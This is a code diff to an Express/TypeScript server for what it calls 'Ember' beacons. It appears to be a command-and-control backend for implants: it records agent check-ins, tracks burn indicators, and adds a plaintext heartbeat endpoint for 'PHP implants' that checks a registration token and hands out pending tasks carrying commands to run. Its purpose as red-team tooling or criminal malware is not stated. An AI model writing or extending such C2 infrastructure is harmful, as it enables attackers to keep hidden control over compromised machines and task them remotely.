@@ -374,9 +374,9 @@ export function registerEmberBeaconRoutes(app: Express): void {
         .limit(20);
 
       const burnEvents = recentBeacons.map(b => ({
-        type: b.beaconType === "registration" ? "c2_callback" : "c2_callback",
+        type: "c2_callback",
         success: true,
-        timestamp: Number(b.timestamp),
+        timestamp: Number(b.receivedAt),
       }));
 
       const burnIndicators = checkBurnIndicators(burnEvents);
@@ -432,17 +432,24 @@ export function registerEmberBeaconRoutes(app: Express): void {
       }
 
       // Record this beacon
+      // Get current beacon count for sequence
+      const agentForSeq = await db.select().from(emberAgents).where(eq(emberAgents.agentId, agentId)).limit(1);
+      const seqNum = (agentForSeq[0]?.beaconCount || 0) + 1;
+      await db.update(emberAgents).set({ beaconCount: seqNum }).where(eq(emberAgents.agentId, agentId));
+
       await db.insert(emberBeacons).values({
         agentId,
-        beaconType: "checkin",
+        sequence: seqNum,
+        state: beaconData.state || "active",
         channel: beaconData.channel || "https",
-        sourceIp: req.ip || req.socket.remoteAddress || "unknown",
-        encrypted: 1,
-        payloadSize: JSON.stringify(message).length,
-        tasksDelivered: pendingTasks.length,
-        resultsReceived,
-        processingTimeMs: Date.now() - now,
-        timestamp: now,
+        healthJson: JSON.stringify({
+          encrypted: true,
+          payloadSize: JSON.stringify(message).length,
+          tasksDelivered: pendingTasks.length,
+          resultsReceived,
+          processingTimeMs: Date.now() - now,
+        }),
+        receivedAt: now,
       });
 
       // Emit beacon event
@@ -626,6 +633,105 @@ export function registerEmberBeaconRoutes(app: Express): void {
       version: "1.0.0",
       timestamp: Date.now(),
     });
+  });
+
+  // ── POST /api/ember/heartbeat ────────────────────────────────────────
+  // Lightweight plaintext heartbeat for simple agents (PHP implants)
+  // Uses registrationToken for authentication instead of ECDH encryption
+  app.post("/api/ember/heartbeat", async (req: Request, res: Response) => {
+    try {
+      const { agentId, registrationToken, state, pid, hostname, systemInfo } = req.body;
+
+      if (!agentId || !registrationToken) {
+        return res.status(400).json({ error: "Missing required fields" });
+      }
+
+      const db = await getDb();
+      const now = Date.now();
+
+      // Verify the agent exists and token matches
+      const agentRows = await db.select().from(emberAgents)
+        .where(eq(emberAgents.agentId, agentId))
+        .limit(1);
+
+      if (agentRows.length === 0) {
+        return res.status(404).json({ error: "Agent not found" });
+      }
+
+      const agent = agentRows[0];
+      if (agent.registrationToken !== registrationToken) {
+        return res.status(403).json({ error: "Invalid token" });
+      }
+
+      // Update agent state
+      const lastBeacon = Number(agent.lastBeaconAt) || 0;
+      const beaconCount = (agent.beaconCount || 0) + 1;
+      await db.update(emberAgents)
+        .set({
+          state: state || "active",
+          lastBeaconAt: now,
+          missedBeacons: 0,
+          beaconCount,
+          pid: pid || agent.pid,
+          updatedAt: now,
+        })
+        .where(eq(emberAgents.agentId, agentId));
+
+      // Record beacon
+      await db.insert(emberBeacons).values({
+        agentId,
+        sequence: beaconCount,
+        state: state || "active",
+        channel: "https_heartbeat",
+        systemInfoJson: systemInfo ? JSON.stringify(systemInfo) : null,
+        receivedAt: now,
+      });
+
+      // Fetch pending tasks
+      const pendingTasks = await db.select().from(emberTasks)
+        .where(and(
+          eq(emberTasks.agentId, agentId),
+          eq(emberTasks.status, "pending"),
+        ))
+        .limit(10);
+
+      // Mark as dispatched
+      if (pendingTasks.length > 0) {
+        const taskIds = pendingTasks.map(t => t.taskId);
+        await db.update(emberTasks)
+          .set({ status: "dispatched", dispatchedAt: now, updatedAt: now })
+          .where(inArray(emberTasks.taskId, taskIds));
+      }
+
+      // Emit beacon event
+      emitEmberBeacon({
+        agentId,
+        hostname: hostname || agent.hostname || "unknown",
+        state: state || "active",
+        channel: "https_heartbeat",
+        tasksDelivered: pendingTasks.length,
+        resultsReceived: 0,
+      });
+
+      console.log(`[Ember Heartbeat] Agent ${agentId} beacon #${beaconCount} from ${req.ip}`);
+
+      return res.json({
+        status: "ok",
+        beaconCount,
+        tasks: pendingTasks.map(t => ({
+          taskId: t.taskId,
+          type: t.taskType,
+          command: t.commandJson ? JSON.parse(t.commandJson as string) : null,
+          priority: t.priority,
+        })),
+        nextBeaconMs: (agent.beaconInterval || 30) * 1000,
+        serverTimestamp: now,
+      });
+
+    } catch (err: any) {
+      console.error("[Ember Heartbeat] Error:", err.message, err.stack);
+      return res.status(500).json({ error: "Heartbeat failed" });
+    }
   });
 
   // ── POST /api/ember/terminate ────────────────────────────────────────
